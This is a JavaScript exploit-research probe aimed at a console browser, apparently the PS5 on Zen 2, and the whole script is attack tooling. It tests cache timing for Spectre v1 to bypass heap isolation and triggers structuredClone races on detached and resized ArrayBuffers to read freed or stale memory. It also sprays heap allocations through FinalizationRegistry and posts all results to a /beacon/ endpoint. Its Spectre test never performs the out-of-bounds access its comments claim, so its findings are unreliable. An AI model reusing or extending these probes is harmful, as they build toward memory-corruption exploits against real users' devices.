/* p84-uarch — Microarchitectural side-channel + TOCTOU probes
 *
 * HARDWARE ENGINEER APPROACH:
 * PS5 = AMD Zen 2 (custom). Spectre v1 vulnerable.
 * If performance.now has sub-microsecond resolution AND
 * we can distinguish cache hits from misses, Spectre v1
 * bypasses ALL software cages (Gigacage, IsoHeap, everything).
 *
 * Also: structuredClone property-order TOCTOU from P3 finding.
 *
 * Beacon prefix: V84U-
 */
(function(){
"use strict";
var RUN_ID = "v84u" + Math.random().toString(36).slice(2,12);
var PREFIX = "V84U-";

function B(tag, body) {
  try {
    var d = typeof body === "object" ? JSON.stringify(body) : String(body);
    fetch("/beacon/" + PREFIX + tag, {
      method: "POST", body: JSON.stringify({r: RUN_ID, b: d.slice(0,1800)}),
      headers: {"Content-Type":"application/json"}
    }).catch(function(){});
  } catch(e){}
}
B("L", "press84-uarch+toctou");

/* ====== M1: Timer resolution probe ====== */
function test_M1() {
  var r = {};
  try {
    // Check performance.now resolution
    r.hasPerfNow = typeof performance !== 'undefined' && typeof performance.now === 'function';

    if (r.hasPerfNow) {
      // Measure smallest observable delta
      var deltas = [];
      for (var i = 0; i < 1000; i++) {
        var t1 = performance.now();
        var t2 = performance.now();
        if (t2 > t1) deltas.push(t2 - t1);
      }

      if (deltas.length > 0) {
        deltas.sort(function(a,b) { return a - b; });
        r.minDelta = deltas[0];
        r.medDelta = deltas[Math.floor(deltas.length/2)];
        r.maxDelta = deltas[deltas.length - 1];
        r.deltaCount = deltas.length;

        // Check if resolution is sub-millisecond
        r.SUB_MS = deltas[0] < 1.0;
        r.SUB_100US = deltas[0] < 0.1;
        r.SUB_5US = deltas[0] < 0.005;

        // Measure unique values (degraded timers repeat)
        var unique = new Set(deltas.slice(0, 100));
        r.uniqueIn100 = unique.size;
      }

      // Also check Date.now resolution
      var dateDeltas = [];
      for (var j = 0; j < 200; j++) {
        var d1 = Date.now();
        var d2 = Date.now();
        if (d2 > d1) dateDeltas.push(d2 - d1);
      }
      if (dateDeltas.length > 0) {
        dateDeltas.sort(function(a,b){return a-b;});
        r.dateMinDelta = dateDeltas[0];
      }
    }

    // Check performance.timeOrigin
    r.hasTimeOrigin = typeof performance !== 'undefined' && typeof performance.timeOrigin === 'number';
    if (r.hasTimeOrigin) r.timeOrigin = performance.timeOrigin;

  } catch(e) { r.err = e.message.slice(0,80); }
  B("M1-TIMER-RES", r);
}

/* ====== M2: Cache timing distinguishability ====== */
function test_M2() {
  var r = {};
  try {
    if (typeof performance === 'undefined' || typeof performance.now !== 'function') {
      r.skip = "no performance.now";
      B("M2-CACHE", r);
      return;
    }

    // Allocate large array to create eviction set
    // L1 data cache on Zen 2: 32KB, 8-way, 64B lines
    // L2: 512KB, 8-way
    // L3: shared, 16MB
    var SIZE = 4 * 1024 * 1024; // 4MB — larger than L2, fits in L3
    var buf = new ArrayBuffer(SIZE);
    var arr = new Uint8Array(buf);

    // Fill with pattern
    for (var i = 0; i < SIZE; i += 64) arr[i] = i & 0xFF;

    // Measure: access same cache line repeatedly (should be L1 hit)
    var hitTimes = [];
    for (var h = 0; h < 200; h++) {
      var t1 = performance.now();
      var v = arr[0]; v = arr[0]; v = arr[0]; v = arr[0];
      v = arr[0]; v = arr[0]; v = arr[0]; v = arr[0];
      var t2 = performance.now();
      hitTimes.push(t2 - t1);
    }

    // Evict: access every cache line in 4MB (flushes L1+L2)
    var evict = 0;
    for (var e = 0; e < SIZE; e += 64) evict += arr[e];
    r.evictSum = evict; // prevent optimization

    // Measure: access the first line again (should be L3/RAM miss)
    var missTimes = [];
    for (var m = 0; m < 200; m++) {
      // Evict first
      for (var e2 = 64; e2 < 65536; e2 += 64) evict += arr[e2];

      var t3 = performance.now();
      var v2 = arr[0];
      var t4 = performance.now();
      missTimes.push(t4 - t3);
    }

    hitTimes.sort(function(a,b){return a-b;});
    missTimes.sort(function(a,b){return a-b;});

    r.hitMin = hitTimes[0];
    r.hitMed = hitTimes[Math.floor(hitTimes.length/2)];
    r.missMin = missTimes[0];
    r.missMed = missTimes[Math.floor(missTimes.length/2)];

    // Can we distinguish? Need >2x difference
    r.ratio = r.missMed > 0 ? (r.missMed / r.hitMed) : 0;
    r.CACHE_DISTINGUISHABLE = r.ratio > 1.5;

  } catch(e) { r.err = e.message.slice(0,80); }
  B("M2-CACHE", r);
}

/* ====== M3: Spectre v1 bounds-check gadget timing ====== */
function test_M3() {
  var r = {};
  try {
    if (typeof performance === 'undefined' || typeof performance.now !== 'function') {
      r.skip = "no performance.now";
      B("M3-SPECTRE", r);
      return;
    }

    // Spectre v1 pattern:
    // if (x < array1.length)
    //   y = array2[array1[x] * 256]
    //
    // Train branch predictor with in-bounds x,
    // then feed OOB x — speculative exec reads OOB,
    // cache side channel leaks the value

    var array1Size = 16;
    var array1 = new Uint8Array(array1Size);
    for (var i = 0; i < array1Size; i++) array1[i] = i;

    // Probe array: 256 entries, each separated by a cache line (64B)
    var probeSize = 256 * 512; // 512B spacing (generous)
    var probeArr = new Uint8Array(probeSize);

    // Train: in-bounds accesses
    var TRAIN = 100;
    var sum = 0;
    for (var t = 0; t < TRAIN; t++) {
      var idx = t % array1Size;
      if (idx < array1.length) {
        sum += probeArr[array1[idx] * 512];
      }
    }

    // Now measure: for each probe index, how fast is access?
    // If a speculative OOB read cached a specific probe line,
    // that index will be faster than the rest
    var probeTimes = new Float64Array(256);
    for (var p = 0; p < 256; p++) {
      var pt1 = performance.now();
      var pv = probeArr[p * 512];
      var pt2 = performance.now();
      probeTimes[p] = pt2 - pt1;
      sum += pv;
    }

    // Find fastest probe index
    var minTime = Infinity, minIdx = -1;
    var maxTime = 0;
    for (var q = 0; q < 256; q++) {
      if (probeTimes[q] < minTime) { minTime = probeTimes[q]; minIdx = q; }
      if (probeTimes[q] > maxTime) maxTime = probeTimes[q];
    }

    r.minProbeIdx = minIdx;
    r.minProbeTime = minTime;
    r.maxProbeTime = maxTime;
    r.probeRatio = maxTime > 0 ? (maxTime / minTime) : 0;
    r.sum = sum; // prevent dead code elimination
    r.SPECTRE_SIGNAL = r.probeRatio > 2.0;

    // Timing distribution: how many distinct timing values?
    var uniqueTimes = new Set();
    for (var u = 0; u < 256; u++) uniqueTimes.add(probeTimes[u]);
    r.uniqueTimings = uniqueTimes.size;

  } catch(e) { r.err = e.message.slice(0,80); }
  B("M3-SPECTRE", r);
}

/* ====== M4: Alternative timer — counting loop ====== */
function test_M4() {
  var r = {};
  try {
    // If performance.now is degraded, use a counting loop as timer
    // Calibrate: how many increments per millisecond?
    var counter = 0;
    var start = Date.now();
    while (Date.now() - start < 10) counter++; // 10ms calibration
    r.countsPerMs = counter / 10;

    // Now use counter to measure cache access
    var SIZE = 1024 * 1024;
    var arr = new Uint8Array(SIZE);
    arr[0] = 42;

    // Measure cached access
    var v = arr[0]; // warm
    var c1 = 0;
    var deadline = Date.now() + 1;
    while (Date.now() < deadline) c1++; // baseline 1ms loop
    r.baseline = c1;

    // Measure with memory access interleaved
    var c2 = 0;
    deadline = Date.now() + 1;
    while (Date.now() < deadline) {
      v = arr[0]; // cached access
      c2++;
    }
    r.withCached = c2;

    // Evict and measure
    for (var e = 0; e < SIZE; e += 64) arr[e] = e & 0xFF;

    var c3 = 0;
    deadline = Date.now() + 1;
    while (Date.now() < deadline) {
      v = arr[0]; // should miss initially
      for (var e2 = 64; e2 < 32768; e2 += 64) v += arr[e2]; // keep evicting
      c3++;
    }
    r.withEvict = c3;
    r.cacheEffect = r.withCached > 0 ? (r.baseline / r.withCached) : 0;

  } catch(e) { r.err = e.message.slice(0,80); }
  B("M4-ALT-TIMER", r);
}

/* ====== T1: structuredClone TOCTOU — reverse property order ====== */
function test_T1() {
  var r = {};
  try {
    var ab = new ArrayBuffer(1024);
    var u8 = new Uint8Array(ab);
    for (var i = 0; i < 1024; i++) u8[i] = 0xCC;

    var detached = false;
    var obj = {};

    // CRITICAL: define trigger FIRST, buf SECOND
    // Property enumeration follows insertion order for string keys
    Object.defineProperty(obj, 'trigger', {
      enumerable: true,
      get: function() {
        if (!detached) {
          detached = true;
          try {
            var tmp = structuredClone(ab, { transfer: [ab] });
          } catch(e) {}
        }
        return 42;
      }
    });
    obj.buf = ab; // inserted second

    try {
      var cloned = structuredClone(obj);
      r.detached = detached;
      r.origDetached = ab.byteLength === 0;
      r.hasBuf = 'buf' in cloned;
      if (cloned.buf instanceof ArrayBuffer) {
        r.clonedBufLen = cloned.buf.byteLength;
        var cv = new Uint8Array(cloned.buf);
        r.byte0 = cv[0];
        r.byte500 = cv.length > 500 ? cv[500] : -1;
        // If we got 1024 bytes from a detached buffer → reading freed memory!
        r.TOCTOU_READ = cloned.buf.byteLength === 1024;
        // If bytes are NOT 0xCC → reading reallocated memory!
        r.STALE_DATA = cv[0] !== 0xCC;
      }
      r.trigger = cloned.trigger;
    } catch(e) {
      r.cloneErr = e.name + ":" + e.message.slice(0,60);
      r.detached = detached;
      // If DataCloneError → serializer detected detachment. Safe.
      r.SAFE = e.name === "DataCloneError";
    }

  } catch(e) { r.err = e.message.slice(0,80); }
  B("T1-TOCTOU-REV", r);
}

/* ====== T2: structuredClone TOCTOU with RAB resize ====== */
function test_T2() {
  var r = {};
  try {
    var rab = new ArrayBuffer(256, { maxByteLength: 4096 });
    var u8 = new Uint8Array(rab);
    for (var i = 0; i < 256; i++) u8[i] = 0xAA;

    var resized = false;
    var obj = {};

    // Trigger resizes RAB DURING clone
    Object.defineProperty(obj, 'sizeCheck', {
      enumerable: true,
      get: function() {
        if (!resized) {
          resized = true;
          // Grow RAB: clone may have captured old size but copy new data
          rab.resize(4096);
          // Fill new region with different pattern
          var newView = new Uint8Array(rab);
          for (var j = 256; j < 4096; j++) newView[j] = 0xBB;
        }
        return rab.byteLength;
      }
    });
    obj.buf = rab;

    try {
      var cloned = structuredClone(obj);
      r.resized = resized;
      r.origSize = rab.byteLength;
      if (cloned.buf instanceof ArrayBuffer) {
        r.clonedBufLen = cloned.buf.byteLength;
        var cv = new Uint8Array(cloned.buf);
        r.byte0 = cv[0];
        if (cv.length > 256) r.byte300 = cv[300];
        // Size confusion: cloned 256 bytes or 4096?
        r.SIZE_CONFUSED = cloned.buf.byteLength !== rab.byteLength;
        r.GOT_EXTENDED = cv.length > 256 && cv[300] === 0xBB;
      }
      r.sizeCheck = cloned.sizeCheck;
    } catch(e) {
      r.cloneErr = e.name + ":" + e.message.slice(0,60);
    }

  } catch(e) { r.err = e.message.slice(0,80); }
  B("T2-TOCTOU-RAB", r);
}

/* ====== T3: structuredClone TOCTOU with RAB shrink ====== */
function test_T3() {
  var r = {};
  try {
    var rab = new ArrayBuffer(4096, { maxByteLength: 4096 });
    var u8 = new Uint8Array(rab);
    for (var i = 0; i < 4096; i++) u8[i] = 0xDD;

    var shrunk = false;
    var obj = {};

    // Trigger SHRINKS RAB during clone — if clone captured size=4096
    // but then copies from rab that's now 64 bytes → reads beyond valid region
    Object.defineProperty(obj, 'sizeCheck', {
      enumerable: true,
      get: function() {
        if (!shrunk) {
          shrunk = true;
          rab.resize(64); // shrink from 4096 to 64!
        }
        return rab.byteLength;
      }
    });
    obj.buf = rab;

    try {
      var cloned = structuredClone(obj);
      r.shrunk = shrunk;
      r.origSize = rab.byteLength; // now 64
      if (cloned.buf instanceof ArrayBuffer) {
        r.clonedBufLen = cloned.buf.byteLength;
        var cv = new Uint8Array(cloned.buf);
        r.byte0 = cv[0];
        r.byte63 = cv.length > 63 ? cv[63] : -1;
        if (cv.length > 64) {
          r.byte100 = cv[100]; // past shrunk boundary
          // If byte100 === 0xDD → reading old data past shrink boundary!
          // If byte100 === 0 → reading mprotected pages (zeroed)
          r.PAST_SHRINK = cv[100] !== 0;
        }
        // If clone has 4096 bytes but rab is only 64 → size confusion!
        r.SIZE_CONFUSED = cloned.buf.byteLength === 4096 && rab.byteLength === 64;
      }
    } catch(e) {
      r.cloneErr = e.name + ":" + e.message.slice(0,60);
    }

  } catch(e) { r.err = e.message.slice(0,80); }
  B("T3-TOCTOU-SHRINK", r);
}

/* ====== T4: FinalizationRegistry + allocator spray timing ====== */
function test_T4() {
  var r = {};
  try {
    // Use FinalizationRegistry (confirmed working in P7) to detect
    // exactly when an object is collected, then allocate replacement
    var gcTimes = [];
    var allocated = 0;
    var registry = new FinalizationRegistry(function(id) {
      gcTimes.push({ id: id, t: performance.now() });
      // Immediately spray allocations to fill freed slot
      for (var i = 0; i < 100; i++) {
        new ArrayBuffer(1024);
        allocated++;
      }
    });

    // Register many objects
    for (var i = 0; i < 50; i++) {
      (function(idx) {
        var obj = { data: new ArrayBuffer(1024), id: idx };
        registry.register(obj, "obj-" + idx);
      })(i);
    }

    // Pressure GC
    var garbage = [];
    for (var j = 0; j < 200000; j++) {
      garbage.push(new ArrayBuffer(512));
      if (j % 50000 === 0) garbage = [];
    }
    garbage = null;

    setTimeout(function() {
      r.gcCallbacks = gcTimes.length;
      r.allocatedInCallback = allocated;
      if (gcTimes.length > 0) {
        r.firstGC = gcTimes[0].id;
        r.lastGC = gcTimes[gcTimes.length-1].id;
        // Time span of GC callbacks
        if (gcTimes.length > 1) {
          r.gcSpanMs = gcTimes[gcTimes.length-1].t - gcTimes[0].t;
        }
      }
      r.GC_CONTROLLABLE = gcTimes.length > 5;
      B("T4-GC-SPRAY", r);
    }, 1000);

  } catch(e) { r.err = e.message.slice(0,80); B("T4-GC-SPRAY", r); }
}

/* ====== Run ====== */
try {
  test_M1();
  setTimeout(test_M2, 300);
  setTimeout(test_M3, 800);
  setTimeout(test_M4, 1500);
  setTimeout(test_T1, 2200);
  setTimeout(test_T2, 2600);
  setTimeout(test_T3, 3000);
  setTimeout(test_T4, 3400);
} catch(e) { B("FATAL", String(e).slice(0,200)); }

var hbI = setInterval(function(){ B("HB","hb"); }, 3000);
setTimeout(function(){ clearInterval(hbI); B("Z2","probe84-done"); }, 25000);
})();
